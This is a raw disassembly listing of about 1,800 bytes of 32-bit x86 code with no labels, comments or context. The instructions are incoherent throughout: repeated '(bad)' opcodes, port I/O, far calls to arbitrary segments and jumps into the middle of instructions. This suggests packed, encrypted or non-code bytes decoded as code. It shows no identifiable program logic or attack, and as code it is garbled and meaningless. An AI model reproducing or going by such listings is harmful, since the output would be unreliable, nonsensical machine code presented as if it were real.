  40a6b0:	scas   al,BYTE PTR es:[edi]
  40a6b1:	push   esp
  40a6b2:	sbb    al,0xdf
  40a6b4:	fcomp  DWORD PTR [ecx+0x7f21acd1]
  40a6ba:	jnp    0x40a6bb
  40a6bc:	(bad)  
  40a6bd:	jmp    0x40a72f
  40a6bf:	pushf  
  40a6c0:	fldenv [esp+eax*4+0x542e1f66]
  40a6c7:	jge    0x40a72b
  40a6c9:	dec    edx
  40a6ca:	jmp    0x40a6ef
  40a6cc:	nop
  40a6cd:	out    0xa6,al
  40a6cf:	test   eax,0xb87ad532
  40a6d4:	lock fwait
  40a6d6:	pop    ebx
  40a6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6d8:	in     eax,0x5b
  40a6da:	das    
  40a6db:	pop    edi
  40a6dc:	mov    BYTE PTR [edi-0x6d],ah
  40a6df:	pop    edi
  40a6e0:	mov    edi,0xbcbdcdbe
  40a6e5:	cmp    eax,0xc2f2b88e
  40a6ea:	(bad)  
  40a6eb:	jne    0x40a748
  40a6ed:	test   eax,0x518ea353
  40a6f2:	adc    edx,DWORD PTR [edi+0x217ee194]
  40a6f8:	dec    edi
  40a6f9:	xor    eax,0xe554403a
  40a6fe:	sbb    al,0xd0
  40a700:	and    DWORD PTR [esi+0x5baf4bd7],esp
  40a706:	xchg   edi,eax
  40a707:	dec    esi
  40a708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a709:	mov    esi,0x8581e920
  40a70e:	cli    
  40a70f:	mov    edx,eax
  40a711:	cmp    esp,DWORD PTR [edx]
  40a713:	mov    esi,0x6c92e030
  40a718:	(bad)  
  40a719:	sar    al,0xad
  40a71c:	loop   0x40a6f9
  40a71e:	pop    edi
  40a71f:	ror    DWORD PTR [ebx],0x5d
  40a722:	das    
  40a723:	loop   0x40a7a2
  40a725:	jb     0x40a753
  40a727:	imul   ebx,DWORD PTR [esi-0x70243828],0x811499c6
  40a731:	xor    dh,BYTE PTR [eax+edi*1+0x72b78ccc]
  40a738:	pop    ebx
  40a739:	push   esp
  40a73a:	addr16 das 
  40a73c:	mov    cs,WORD PTR [eax-0x546015d9]
  40a742:	mov    ch,BYTE PTR [ecx+0x4c]
  40a745:	xor    DWORD PTR [edx-0x44],0x384c22b8
  40a74c:	sbb    edi,ecx
  40a74e:	adc    BYTE PTR [esi+0x71237d7f],bh
  40a754:	pusha  
  40a755:	push   ds
  40a756:	call   0xe619:0xab38c655
  40a75d:	push   ebx
  40a75e:	dec    ecx
  40a75f:	pop    ds
  40a760:	jno    0x40a7d4
  40a762:	out    dx,eax
  40a763:	push   esp
  40a764:	adc    al,0xbe
  40a766:	arpl   WORD PTR [ebx],bp
  40a768:	jle    0x40a746
  40a76a:	aas    
  40a76b:	out    0xc8,eax
  40a76d:	xchg   edx,ebx
  40a76f:	mov    ecx,0x4ed5a68b
  40a774:	sbb    ebx,ebx
  40a776:	sbb    dl,BYTE PTR [ebp-0x53]
  40a779:	fistp  WORD PTR [ecx-0x16]
  40a77c:	lods   eax,DWORD PTR ds:[esi]
  40a77d:	fs (bad) 
  40a77f:	ds daa 
  40a781:	test   eax,0xc4080faa
  40a786:	xor    DWORD PTR [ebx],edi
  40a788:	xor    al,0x44
  40a78a:	shl    BYTE PTR [ebx-0x63],0xca
  40a78e:	bound  edi,QWORD PTR [ecx-0x47fa09c1]
  40a794:	out    dx,eax
  40a795:	mov    es,WORD PTR [ecx]
  40a797:	lahf   
  40a798:	xor    al,BYTE PTR [edi+0x564950b7]
  40a79e:	jnp    0x40a78a
  40a7a0:	or     edx,DWORD PTR [esi]
  40a7a2:	test   BYTE PTR [edi-0x74],bh
  40a7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7a6:	ja     0x40a784
  40a7a8:	sbb    BYTE PTR [edx],0x80
  40a7ab:	mov    al,0x3
  40a7ad:	jg     0x40a771
  40a7af:	mov    ch,0xd2
  40a7b1:	ss pop edi
  40a7b3:	or     al,0xb2
  40a7b5:	jg     0x40a75b
  40a7b7:	sub    BYTE PTR [ebx+0x76c8acee],al
  40a7bd:	out    dx,al
  40a7be:	(bad)  
  40a7bf:	loopne 0x40a7cf
  40a7c1:	das    
  40a7c2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7c4:	lods   eax,DWORD PTR ds:[esi]
  40a7c5:	cmc    
  40a7c6:	es pop es
  40a7c8:	mov    esi,0x8544d9dc
  40a7cd:	je     0x40a846
  40a7cf:	xor    al,0xfa
  40a7d1:	stos   BYTE PTR es:[edi],al
  40a7d2:	fdiv   DWORD PTR [edx+0x7f9d3316]
  40a7d8:	adc    BYTE PTR [ecx+0xa36bc46],cl
  40a7de:	dec    edx
  40a7df:	push   esp
  40a7e0:	fmul   DWORD PTR [ecx+0x2f]
  40a7e3:	push   0xf765feec
  40a7e8:	je     0x40a7c1
  40a7ea:	cmp    eax,0xb02ee2ae
  40a7ef:	add    dl,BYTE PTR [edx-0x4c]
  40a7f2:	mov    dh,0xd7
  40a7f4:	loopne 0x40a7e5
  40a7f6:	int3   
  40a7f7:	push   esi
  40a7f8:	(bad)  
  40a7f9:	in     eax,dx
  40a7fa:	jno    0x40a849
  40a7fc:	or     bh,BYTE PTR [eax+0x79]
  40a7ff:	js     0x40a7db
  40a801:	mov    eax,0xd39ee47
  40a806:	sbb    BYTE PTR [eax+0xe],0x89
  40a80a:	add    ecx,DWORD PTR [ecx-0x8]
  40a80d:	lods   eax,DWORD PTR ds:[esi]
  40a80e:	in     al,dx
  40a80f:	pop    ebx
  40a810:	xchg   BYTE PTR [edi-0x5d7bfe4],dh
  40a816:	lods   al,BYTE PTR ds:[esi]
  40a817:	scas   al,BYTE PTR es:[edi]
  40a818:	(bad)  
  40a819:	in     eax,0xb4
  40a81b:	add    ah,bh
  40a81d:	dec    ecx
  40a81e:	in     eax,dx
  40a81f:	loop   0x40a882
  40a821:	aam    0x53
  40a823:	vmread DWORD PTR [edx+0x63],edi
  40a827:	sbb    ch,ah
  40a829:	push   edi
  40a82a:	bnd jbe 0x40a884
  40a82d:	xchg   edi,eax
  40a82e:	cs nop
  40a830:	xchg   ebp,eax
  40a831:	jne    0x40a7dd
  40a833:	xchg   ebp,eax
  40a834:	cdq    
  40a835:	retf   
  40a836:	sbb    al,0x4d
  40a838:	loope  0x40a7de
  40a83a:	dec    edi
  40a83b:	out    dx,al
  40a83c:	mov    WORD PTR [ebp+0x7563b492],?
  40a842:	outs   dx,BYTE PTR ds:[esi]
  40a843:	out    dx,eax
  40a844:	jg     0x40a88e
  40a846:	mov    dl,0x42
  40a848:	push   ebp
  40a849:	or     esp,DWORD PTR [ebp+0x6a84416b]
  40a84f:	outs   dx,DWORD PTR ds:[esi]
  40a850:	or     eax,eax
  40a852:	mov    dh,0x6f
  40a854:	inc    ecx
  40a855:	lods   al,BYTE PTR ds:[esi]
  40a856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a857:	in     eax,0x0
  40a859:	imul   ebp,DWORD PTR [ecx],0x57749a77
  40a85f:	adc    al,0x73
  40a861:	lods   al,BYTE PTR ds:[esi]
  40a862:	adc    BYTE PTR [esp+edi*8+0x1],al
  40a866:	push   es
  40a867:	pop    edi
  40a868:	daa    
  40a869:	dec    eax
  40a86a:	xor    al,0xee
  40a86c:	je     0x40a8b8
  40a86e:	sub    al,0xaf
  40a870:	adc    bh,BYTE PTR [edi+0x7e0dcca]
  40a876:	call   0x573c61ea
  40a87b:	push   cs
  40a87c:	pop    ss
  40a87d:	outs   dx,BYTE PTR ds:[esi]
  40a87e:	xor    al,0x39
  40a880:	repz out dx,eax
  40a882:	sub    dx,di
  40a885:	enter  0x2b4d,0x6f
  40a889:	push   es
  40a88a:	ret    
  40a88b:	cld    
  40a88c:	mov    al,ds:0x1ee18e38
  40a891:	das    
  40a892:	cmp    dl,BYTE PTR [ecx-0x5895e89a]
  40a898:	mov    bl,0xd6
  40a89a:	cmp    esp,esi
  40a89c:	inc    esp
  40a89d:	js     0x40a867
  40a89f:	out    0x6d,al
  40a8a1:	int3   
  40a8a2:	sbb    al,0x85
  40a8a4:	test   DWORD PTR [eax+edi*2-0x29],esp
  40a8a8:	adc    al,0x2c
  40a8aa:	adc    edx,DWORD PTR [eax+0x26]
  40a8ad:	les    ebp,FWORD PTR ds:0x24baa2ff
  40a8b3:	mov    edx,0x7a6f3ea5
  40a8b8:	mov    ebx,0x88cc80f3
  40a8bd:	loop   0x40a8bb
  40a8bf:	add    al,0x2c
  40a8c1:	xlat   BYTE PTR ds:[ebx]
  40a8c2:	fst    QWORD PTR [edi-0x2e]
  40a8c5:	mov    ebp,0x1efd200c
  40a8ca:	pop    ebp
  40a8cb:	mov    al,0x59
  40a8cd:	jg     0x40a91f
  40a8cf:	ss out 0xa1,al
  40a8d2:	sbb    BYTE PTR [eax-0x3],cl
  40a8d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d6:	leave  
  40a8d7:	dec    eax
  40a8d8:	gs jmp 0x499b:0xf785984
  40a8e0:	and    al,0xc
  40a8e2:	add    cl,BYTE PTR ds:0x5e7c9281
  40a8e8:	or     ch,BYTE PTR [edi+0x4f38fae7]
  40a8ee:	xor    DWORD PTR [edi+0x28],ebx
  40a8f1:	jge    0x40a8b4
  40a8f3:	fs cwde 
  40a8f5:	jb     0x40a949
  40a8f7:	adc    cl,BYTE PTR [edi+0x7c9c05d6]
  40a8fd:	cmp    DWORD PTR [ebp-0x3b3e04d5],ebp
  40a903:	and    DWORD PTR [esi+eiz*1+0x67d8745d],esp
  40a90a:	aad    0x0
  40a90c:	mov    bh,0x1
  40a90e:	mov    esp,ecx
  40a910:	enter  0x597a,0xe1
  40a914:	cli    
  40a915:	mov    cl,0x23
  40a917:	sbb    BYTE PTR [esi],ah
  40a919:	mov    ch,0x26
  40a91b:	rol    DWORD PTR [edi],cl
  40a91d:	adc    bl,ah
  40a91f:	dec    ebx
  40a920:	sub    DWORD PTR [eax-0x2a],0x63
  40a924:	mov    edx,0x1ce66dd0
  40a929:	jl     0x40a8f6
  40a92b:	pop    ss
  40a92c:	xor    ch,0x3d
  40a92f:	popa   
  40a930:	dec    esp
  40a931:	and    eax,0x37167258
  40a936:	sahf   
  40a937:	mov    esp,0xc33a542d
  40a93c:	enter  0xb93e,0x41
  40a940:	popa   
  40a941:	adc    al,0x3c
  40a943:	div    BYTE PTR [ebx+ebx*1-0x41]
  40a947:	pushf  
  40a948:	pop    ss
  40a949:	sahf   
  40a94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a94b:	clc    
  40a94c:	imul   edx,eax,0x920456a8
  40a952:	fsubr  st,st(7)
  40a954:	gs lahf 
  40a956:	in     eax,dx
  40a957:	pop    esi
  40a958:	imul   eax,DWORD PTR [ebx+0x7],0xffffff8b
  40a95c:	push   edi
  40a95d:	test   al,0x55
  40a95f:	jge    0x40a979
  40a961:	shl    DWORD PTR [edx+0x5d],1
  40a964:	dec    esp
  40a965:	ss ret 
  40a967:	mov    ebx,0x73e2ff95
  40a96c:	mov    ebx,0x95198b21
  40a971:	call   0x1b85e690
  40a976:	test   DWORD PTR [ebx],esp
  40a978:	jns    0x40a991
  40a97a:	imul   eax,esp,0x2e
  40a97d:	pop    esi
  40a97e:	dec    edi
  40a97f:	inc    ebp
  40a980:	push   edi
  40a981:	scas   al,BYTE PTR es:[edi]
  40a982:	aad    0xa8
  40a984:	test   edx,ebx
  40a986:	pop    ds
  40a987:	into   
  40a988:	mov    eax,0x45d39d63
  40a98d:	cwde   
  40a98e:	stc    
  40a98f:	fadd   QWORD PTR [edi]
  40a991:	cmp    eax,0x78b5222b
  40a996:	ficom  WORD PTR [ecx+0x42533848]
  40a99c:	dec    ebp
  40a99d:	pop    ds
  40a99e:	xchg   dl,ch
  40a9a0:	inc    edx
  40a9a1:	mov    dh,0x41
  40a9a3:	fs icebp 
  40a9a5:	retf   
  40a9a6:	cld    
  40a9a7:	cmp    al,0x27
  40a9a9:	out    0xf5,eax
  40a9ab:	cmp    eax,DWORD PTR [edx]
  40a9ad:	push   ebx
  40a9ae:	pop    eax
  40a9af:	pusha  
  40a9b0:	cmp    eax,0x708e9ad8
  40a9b5:	popa   
  40a9b6:	repnz pop ebx
  40a9b8:	fnsave [ecx+0x50]
  40a9bb:	das    
  40a9bc:	sbb    al,0xd7
  40a9be:	or     cl,BYTE PTR [ecx]
  40a9c0:	add    bl,dl
  40a9c2:	add    edx,DWORD PTR [esi+0x8]
  40a9c5:	gs pop ds
  40a9c7:	cmp    esi,eax
  40a9c9:	ror    BYTE PTR [ecx],cl
  40a9cb:	adc    esi,DWORD PTR [edi+eax*8+0x8]
  40a9cf:	push   ds
  40a9d0:	dec    eax
  40a9d1:	in     al,0xa6
  40a9d3:	dec    ecx
  40a9d4:	lods   al,BYTE PTR ds:[esi]
  40a9d5:	pop    esp
  40a9d6:	rcr    BYTE PTR [edi-0x89a3f75],cl
  40a9dc:	pop    edi
  40a9dd:	push   es
  40a9de:	jno    0x40aa4d
  40a9e0:	je     0x40a9cc
  40a9e2:	aam    0x4
  40a9e4:	inc    edx
  40a9e5:	retf   
  40a9e6:	mov    al,0x55
  40a9e8:	dec    ebx
  40a9e9:	je     0x40aa06
  40a9eb:	xor    DWORD PTR [esi],ebp
  40a9ed:	xchg   ebx,eax
  40a9ee:	outs   dx,DWORD PTR ds:[esi]
  40a9ef:	iret   
  40a9f0:	call   0x6054:0x70a4a54e
  40a9f7:	(bad)  
  40a9f8:	lahf   
  40a9f9:	cmp    eax,0x961ae5a2
  40a9fe:	xchg   edi,eax
  40a9ff:	xor    eax,0xa5ad5d79
  40aa04:	pusha  
  40aa05:	call   0x8e930c16
  40aa0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa0c:	mov    edi,0xb23b6879
  40aa11:	out    0x2e,eax
  40aa13:	leave  
  40aa14:	dec    esi
  40aa15:	outs   dx,DWORD PTR ds:[esi]
  40aa16:	popa   
  40aa17:	(bad)  
  40aa18:	es into 
  40aa1a:	clc    
  40aa1b:	aam    0x33
  40aa1d:	dec    edx
  40aa1e:	in     eax,dx
  40aa1f:	push   ebx
  40aa20:	or     eax,0x33d70576
  40aa25:	inc    eax
  40aa26:	outs   dx,DWORD PTR ds:[esi]
  40aa27:	add    eax,0x18035f02
  40aa2c:	or     DWORD PTR [edx+ecx*1+0x15],edi
  40aa30:	dec    ebx
  40aa31:	xchg   esi,eax
  40aa32:	jns    0x40aa8a
  40aa34:	xchg   esi,eax
  40aa35:	mov    dh,0x50
  40aa37:	xor    eax,0xf7e0ddb8
  40aa3c:	in     eax,dx
  40aa3d:	adc    ch,ah
  40aa3f:	outs   dx,DWORD PTR ds:[esi]
  40aa40:	shl    DWORD PTR [ecx+0xd758ac4],cl
  40aa46:	pop    ecx
  40aa47:	rcr    DWORD PTR [esi-0x52d944b3],cl
  40aa4d:	mov    ch,0xa5
  40aa4f:	ins    DWORD PTR es:[edi],dx
  40aa50:	mov    ch,0x88
  40aa52:	sub    BYTE PTR [ebx-0x26],ah
  40aa55:	and    al,0xf2
  40aa57:	jno    0x40aa53
  40aa59:	pop    esp
  40aa5a:	adc    DWORD PTR [esi+0x36],eax
  40aa5d:	loope  0x40aa91
  40aa5f:	sub    al,0x40
  40aa61:	xor    DWORD PTR [edi+0x45],ebx
  40aa64:	cli    
  40aa65:	and    al,0x89
  40aa67:	xor    esp,DWORD PTR [esi-0x17]
  40aa6a:	or     eax,0x3987237b
  40aa6f:	or     edx,esp
  40aa71:	mov    esi,0x8c99a741
  40aa76:	mov    WORD PTR [edx-0x1c],?
  40aa79:	cmp    dl,BYTE PTR [ebx]
  40aa7b:	popa   
  40aa7c:	dec    edx
  40aa7d:	aas    
  40aa7e:	cmp    bh,BYTE PTR [edi+0x4ee8719f]
  40aa84:	ret    0xcf61
  40aa87:	and    cl,BYTE PTR [eax]
  40aa89:	retf   0xee63
  40aa8c:	dec    esi
  40aa8d:	aas    
  40aa8e:	push   ecx
  40aa8f:	sub    BYTE PTR [edx+0x3964d20],dl
  40aa95:	mov    ecx,0x11dc7f28
  40aa9a:	xor    ebp,esp
  40aa9c:	cmp    eax,0xeb8c8360
  40aaa1:	sub    al,0x67
  40aaa3:	fsub   QWORD PTR [edx+0x3b4b12b9]
  40aaa9:	arpl   WORD PTR [edi],sp
  40aaab:	lock mov esp,0xa1efd126
  40aab1:	stos   BYTE PTR es:[edi],al
  40aab2:	add    bl,BYTE PTR [eax]
  40aab4:	jbe    0x40aadb
  40aab6:	xchg   ebp,eax
  40aab7:	cmp    eax,DWORD PTR [edx-0x50]
  40aaba:	adc    al,0xe0
  40aabc:	mov    ah,0x58
  40aabe:	jbe    0x40aafb
  40aac0:	xchg   esp,eax
  40aac1:	lods   al,BYTE PTR ds:[esi]
  40aac2:	sbb    dh,BYTE PTR [ebx-0x161871a9]
  40aac8:	aaa    
  40aac9:	popf   
  40aaca:	mov    ebp,0x280c18dd
  40aacf:	data16 adc bh,BYTE PTR [esi-0x72]
  40aad3:	mov    edi,0xc89b4ee8
  40aad8:	outs   dx,BYTE PTR ds:[esi]
  40aad9:	paddusb mm6,QWORD PTR [edi]
  40aadc:	fdecstp 
  40aade:	dec    eax
  40aadf:	or     DWORD PTR [eax],edi
  40aae1:	xchg   edx,eax
  40aae2:	cmp    dh,BYTE PTR [eax-0x52a811ff]
  40aae8:	adc    ebp,DWORD PTR [esi+0x471081c0]
  40aaee:	adc    al,0xf1
  40aaf0:	sahf   
  40aaf1:	icebp  
  40aaf2:	loopne 0x40ab01
  40aaf4:	fist   DWORD PTR [edx-0x10ede4e3]
  40aafa:	dec    esp
  40aafb:	inc    edx
  40aafc:	les    esi,FWORD PTR [edx-0x393ddd5e]
  40ab02:	enter  0xdf39,0xb8
  40ab06:	sbb    BYTE PTR [edx-0x21],0xa9
  40ab0a:	js     0x40aacd
  40ab0c:	push   ss
  40ab0d:	xchg   esp,eax
  40ab0e:	jmp    0x4c64:0x2f41ccf
  40ab15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab16:	xchg   edi,eax
  40ab17:	fwait
  40ab18:	hlt    
  40ab19:	ret    0x7a4b
  40ab1c:	sar    esi,0xb5
  40ab1f:	dec    edx
  40ab20:	xor    esp,DWORD PTR [esi+0x4588d9b1]
  40ab26:	cmp    al,0x9c
  40ab28:	stc    
  40ab29:	xchg   esi,eax
  40ab2a:	push   edx
  40ab2b:	sub    ebp,esp
  40ab2d:	ins    BYTE PTR es:[edi],dx
  40ab2e:	sbb    ch,BYTE PTR [ebx-0x78]
  40ab31:	ficomp DWORD PTR [eax+0x4]
  40ab34:	mov    dh,0x98
  40ab36:	popf   
  40ab37:	fcom   QWORD PTR [esi]
  40ab39:	mov    bl,0x69
  40ab3b:	push   0x749f3a16
  40ab40:	mov    dl,0x48
  40ab42:	cld    
  40ab43:	inc    ebx
  40ab44:	mov    edi,0x1f776097
  40ab49:	dec    esp
  40ab4a:	loopne 0x40aae1
  40ab4c:	mov    eax,ds:0x6ab77b3f
  40ab51:	les    eax,FWORD PTR ds:[ebp+0x2d28e98f]
  40ab58:	sbb    BYTE PTR [ebx-0xc2ba60d],0x93
  40ab5f:	out    0x3,al
  40ab61:	add    ah,dl
  40ab63:	call   0x6f85206c
  40ab68:	je     0x40abb3
  40ab6a:	and    ch,ah
  40ab6c:	je     0x40abb4
  40ab6e:	inc    ecx
  40ab6f:	pop    edx
  40ab70:	cmp    dh,BYTE PTR [esi]
  40ab72:	pop    edx
  40ab73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab74:	iret   
  40ab75:	lock inc ebp
  40ab77:	iret   
  40ab78:	sub    eax,0xedf45753
  40ab7d:	lea    edi,[edi+0x50]
  40ab80:	(bad)  [eax]
  40ab82:	cmp    cl,ch
  40ab84:	sti    
  40ab85:	hlt    
  40ab86:	dec    ecx
  40ab87:	dec    esi
  40ab88:	lds    esp,FWORD PTR [edx]
  40ab8a:	inc    esp
  40ab8b:	push   0x3d3f388b
  40ab90:	fild   DWORD PTR [edx+0x5c]
  40ab93:	int    0x55
  40ab95:	aaa    
  40ab96:	mov    ecx,edx
  40ab98:	mov    edx,0x4f2e831a
  40ab9d:	jg     0x40ab8c
  40ab9f:	pop    esi
  40aba0:	add    ah,BYTE PTR [ebx+0x5]
  40aba3:	fcomp  DWORD PTR [ebx-0x1d]
  40aba6:	loop   0x40ab64
  40aba8:	loop   0x40ac05
  40abaa:	cmc    
  40abab:	ret    0xe94d
  40abae:	call   0xb4d19f28
  40abb3:	dec    eax
  40abb4:	test   al,0x17
  40abb6:	out    dx,eax
  40abb7:	lahf   
  40abb8:	rcl    ecx,cl
  40abba:	add    eax,0x18660cc3
  40abbf:	dec    ecx
  40abc0:	ror    BYTE PTR [eax],cl
  40abc2:	daa    
  40abc3:	and    eax,DWORD PTR [ecx+0x6d515eac]
  40abc9:	mov    bl,0xb7
  40abcb:	xchg   edi,eax
  40abcc:	mov    al,ds:0xd918c4d6
  40abd1:	fbld   TBYTE PTR [edx-0x1]
  40abd4:	mov    ah,0x30
  40abd6:	push   di
  40abd8:	adc    DWORD PTR [edi+0x2a],esi
  40abdb:	leave  
  40abdc:	xchg   BYTE PTR [ecx-0x74],cl
  40abdf:	push   ecx
  40abe0:	mov    ds:0x9799ff08,al
  40abe5:	inc    eax
  40abe6:	out    0x3c,al
  40abe8:	push   0x95f19fa
  40abed:	fild   WORD PTR [eax+0x5f]
  40abf0:	push   ebx
  40abf1:	and    ch,BYTE PTR [si]
  40abf4:	xor    BYTE PTR [ebp-0x46851d52],ah
  40abfa:	push   ds
  40abfb:	inc    esp
  40abfc:	loopne 0x40ac00
  40abfe:	pop    ss
  40abff:	jbe    0x40ac5d
  40ac01:	cwde   
  40ac02:	outs   dx,BYTE PTR ds:[esi]
  40ac03:	jg     0x40ac14
  40ac05:	mov    edi,0xcccc54bb
  40ac0a:	cmp    al,BYTE PTR [edx-0x72]
  40ac0d:	out    0x3c,al
  40ac0f:	mov    al,ch
  40ac11:	xchg   WORD PTR [ebp+0x46eb003c],bp
  40ac18:	mov    ch,0xa9
  40ac1a:	pop    es
  40ac1b:	fadd   st,st(4)
  40ac1d:	xchg   ebx,eax
  40ac1e:	ret    
  40ac1f:	jl     0x40abca
  40ac21:	lea    ebx,[edi+0x7b4e1c6]
  40ac27:	jnp    0x40ac58
  40ac29:	clc    
  40ac2a:	sbb    eax,0x17274b0d
  40ac2f:	nop
  40ac30:	retf   
  40ac31:	inc    esp
  40ac32:	scas   al,BYTE PTR es:[edi]
  40ac33:	pop    ecx
  40ac34:	rol    edi,cl
  40ac36:	push   ebp
  40ac37:	pop    ebp
  40ac38:	call   0x4e0f:0x9d1c7a19
  40ac3f:	xlat   BYTE PTR ds:[ebx]
  40ac40:	cli    
  40ac41:	js     0x40ac28
  40ac43:	or     edx,DWORD PTR [ebx]
  40ac45:	and    bh,BYTE PTR [eax]
  40ac47:	add    esp,DWORD PTR fs:[ebx-0x7b]
  40ac4b:	jne    0x40ac20
  40ac4d:	inc    esi
  40ac4e:	jae    0x40abf2
  40ac50:	xchg   DWORD PTR [ecx+ecx*2+0x4388a2bd],eax
  40ac57:	imul   ebp,ebx,0xffffffee
  40ac5a:	inc    eax
  40ac5b:	jmp    ebp
  40ac5d:	inc    ecx
  40ac5e:	add    DWORD PTR [ebx],0x7f5020c1
  40ac64:	lods   al,BYTE PTR ds:[esi]
  40ac65:	adc    BYTE PTR [esi-0x28],dl
  40ac68:	clc    
  40ac69:	in     eax,dx
  40ac6a:	fsub   st(2),st
  40ac6c:	ins    BYTE PTR es:[edi],dx
  40ac6d:	sub    al,0x7d
  40ac6f:	sub    BYTE PTR [ecx-0x745549c3],0xf1
  40ac76:	and    ch,BYTE PTR [ebp+eax*4+0x74a625a8]
  40ac7d:	xchg   ebp,eax
  40ac7e:	cwde   
  40ac7f:	mov    al,0xdf
  40ac81:	adc    DWORD PTR [edx],edi
  40ac83:	popf   
  40ac84:	cmp    BYTE PTR [ecx+0x7c],al
  40ac87:	shl    al,0xbc
  40ac8a:	mov    ebx,0x988c0ce3
  40ac8f:	add    DWORD PTR [edi+0x530e3e1f],esi
  40ac95:	cmp    DWORD PTR [eax],ebp
  40ac97:	inc    edx
  40ac98:	js     0x40ad16
  40ac9a:	sahf   
  40ac9b:	jns    0x40acd7
  40ac9d:	adc    DWORD PTR ds:0x79111e66,esi
  40aca3:	stc    
  40aca4:	cmp    al,0xb9
  40aca6:	es (bad) 
  40aca8:	adc    BYTE PTR [ecx-0x20091726],ch
  40acae:	clc    
  40acaf:	cmp    ah,cl
  40acb1:	add    bh,bl
  40acb3:	mov    edi,0x89521bcc
  40acb8:	ret    0x2d15
  40acbb:	in     al,dx
  40acbc:	pop    esi
  40acbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acbe:	mov    BYTE PTR [esp+eiz*2+0xf],bh
  40acc2:	sbb    DWORD PTR [edi+0x1b],ebx
  40acc5:	cmp    ebx,edx
  40acc7:	mov    al,ds:0xc3805225
  40accc:	dec    ebx
  40accd:	sbb    eax,0xc2170f8b
  40acd2:	dec    edx
  40acd3:	jo     0x40acb5
  40acd5:	fs (bad) 
  40acd7:	jle    0x40ad1d
  40acd9:	ror    eax,cl
  40acdb:	stc    
  40acdc:	arpl   WORD PTR [esi+ecx*4],bp
  40acdf:	cmp    BYTE PTR [edi+0x75843c1c],dl
  40ace5:	addr16 sbb esi,edx
  40ace8:	push   0x4504b5ce
  40aced:	iret   
  40acee:	(bad)  
  40acef:	addr16 xchg ebx,eax
  40acf1:	sahf   
  40acf2:	ds push ss
  40acf4:	icebp  
  40acf5:	call   0xcb57:0xd2ab2010
  40acfc:	loopne 0x40ad10
  40acfe:	data16 cli 
  40ad00:	fwait
  40ad01:	push   ds
  40ad02:	scas   al,BYTE PTR es:[edi]
  40ad03:	ror    BYTE PTR [esi-0x2c1562c4],1
  40ad09:	add    ch,BYTE PTR [edx-0x5cfd7f0d]
  40ad0f:	mov    WORD PTR [eax],ds
  40ad11:	and    eax,0xc4db7eb
  40ad16:	cmc    
  40ad17:	mov    al,ds:0xf4abb207
  40ad1c:	das    
  40ad1d:	add    edx,DWORD PTR [edi]
  40ad1f:	sub    al,0xd5
  40ad21:	mov    edi,DWORD PTR [edi+0x332c9e7d]
  40ad27:	xor    BYTE PTR [edi-0x302ea759],ch
  40ad2d:	cdq    
  40ad2e:	mov    edi,fs
  40ad30:	add    DWORD PTR [ebp-0x781c0835],ebx
  40ad36:	sar    DWORD PTR [eax],1
  40ad38:	fstp   QWORD PTR [edx+eiz*4]
  40ad3b:	cmc    
  40ad3c:	mov    esi,0x65281f17
  40ad41:	aas    
  40ad42:	or     ah,BYTE PTR [esi]
  40ad44:	lea    eax,[ebp-0x63]
  40ad47:	xlat   BYTE PTR ds:[ebx]
  40ad48:	leave  
  40ad49:	or     eax,0xdac3c8b6
  40ad4e:	xor    DWORD PTR [esi+0x6a],eax
  40ad51:	stc    
  40ad52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad53:	mov    dl,0x47
  40ad55:	xor    eax,0x54ce9990
  40ad5a:	mov    esi,0x908d3d86
  40ad5f:	sub    al,0x80
  40ad61:	mov    ecx,0x3e027acf
  40ad66:	cmp    DWORD PTR [edi],edx
  40ad68:	icebp  
  40ad69:	pop    eax
  40ad6a:	pop    ds
  40ad6b:	cmp    cl,ch
  40ad6d:	das    
  40ad6e:	xlat   BYTE PTR ds:[ebx]
  40ad6f:	fcomp  st(1)
  40ad71:	pop    ds
  40ad72:	fadd   DWORD PTR [esi+0x73018ff2]
  40ad78:	lods   eax,DWORD PTR ds:[esi]
  40ad79:	arpl   WORD PTR [esi],bp
  40ad7b:	ret    
  40ad7c:	or     eax,0xd58b7f1a
  40ad81:	and    ah,BYTE PTR [esi]
  40ad83:	push   edi
  40ad84:	cmp    eax,0x4975127f
  40ad89:	leave  
  40ad8a:	xchg   esp,eax
  40ad8b:	push   eax
  40ad8c:	test   BYTE PTR [edi],0x37
  40ad8f:	out    0x78,eax
  40ad91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad92:	sbb    al,0x6a
  40ad94:	or     DWORD PTR [eax],edi
  40ad96:	jnp    0x40add5
  40ad98:	adc    BYTE PTR [esi-0x41ed3873],ch
  40ad9e:	jae    0x40ad35
  40ada0:	xchg   ebx,eax
  40ada1:	rol    DWORD PTR [edi+edx*8+0x3261aed7],cl
  40ada8:	sub    eax,0x9bbd1149
  40adad:	adc    esp,DWORD PTR [ecx+esi*1-0x220d68b4]
  40adb4:	jno    0x40aded
  40adb6:	ins    BYTE PTR es:[edi],dx
  40adb7:	mov    ecx,0xfe53e7cc
  40adbc:	xchg   edx,eax
  40adbd:	inc    eax
  40adbe:	push   ebp
  40adbf:	nop
  40adc0:	bound  eax,QWORD PTR [edx+eax*8-0x3e909cea]
  40adc7:	loope  0x40adf5
  40adc9:	mov    bh,0x9c
  40adcb:	cmp    BYTE PTR [edx],bl
  40adcd:	push   edx
  40adce:	hlt    
  40adcf:	inc    ebx
  40add0:	mov    edx,0x1660302f
  40add5:	xchg   BYTE PTR [ebx-0x623ac044],ch
  40addb:	inc    ecx
  40addc:	cmc    
  40addd:	(bad)  
  40adde:	jmp    0x40ad92
  40ade0:	mov    dh,0x76
  40ade2:	push   esi
  40ade3:	or     eax,0xfceaee93
  40ade8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ade9:	sub    dh,ch
  40adeb:	pop    es
  40adec:	lock fcomp DWORD PTR [ebx-0x44488169]
  40adf3:	cmp    al,0x86
